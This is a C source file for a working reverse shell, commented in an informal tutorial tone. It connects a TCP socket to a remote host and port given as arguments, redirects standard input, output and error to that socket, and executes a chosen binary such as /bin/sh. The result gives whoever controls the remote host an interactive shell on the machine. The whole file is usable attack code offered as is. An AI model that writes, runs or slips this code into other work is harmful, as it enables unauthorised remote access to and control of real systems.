#include <stdarg.h>        // Includes standard argument handling library, though it's not used in this code
#include <arpa/inet.h>   // Includes definitions for internet operations, such as `inet_addr` and `sockaddr_in`
#include <stdio.h>          // Includes standard input/output functions, though only `printf` is used in the comments
#include <unistd.h>       // Includes standard symbolic constants and types, and POSIX functions such as `dup2` and `execve`
#include <stdlib.h>        // Includes functions for memory allocation, process control, conversions, and others

int main(int argc, char **argv) {
    int RP = 0; 
    RP = atoi(argv[1]); 

  // arg handling
    char *RH  = argv[2];
    char *BIN = argv[3];
    
    int is = 0;
    is = socket(AF_INET, SOCK_STREAM, 0); // Create a new  socket of type IPv4 of the TCP protocol, with `is`

  // Create a socket structure to specify the address of the remote host
    struct sockaddr_in s1; 
    s1.sin_family      = AF_INET;                    // Set the address family to IPv4(IPv6 is still a bit tricky, I only used it for IPv4 so IPv4 it is)
    s1.sin_port        = htons(RP);                   // Set the port number, converting it to network byte order
    s1.sin_addr.s_addr = inet_addr(RH);     // Convert the IP address from string to binary form


  // this is where the actual 'magic' happens 
  // Aka connecting the socket to the specified address and port (program[:ip:port])
    connect(is, (struct sockaddr *) &s1, sizeof(s1)); 

  /*
  * Redirect the following:
    - STDIN(standard input),  
    - STDOUT(output)
    - STDERR(error streams)
  * to the socket)
  */

  // as it's only for redir. stuff
  // redir. fdescs `i`  to socket `is`
    for(int i=0; i<3; dup2(is, i), i++);
  
    // Prep the env,args, and the execve call (system Execute) with the binary to execute (e.g /bin/sh)
    char * const A[] = {BIN, NULL};
    execve(BIN, A, NULL);
    return 0; 
}
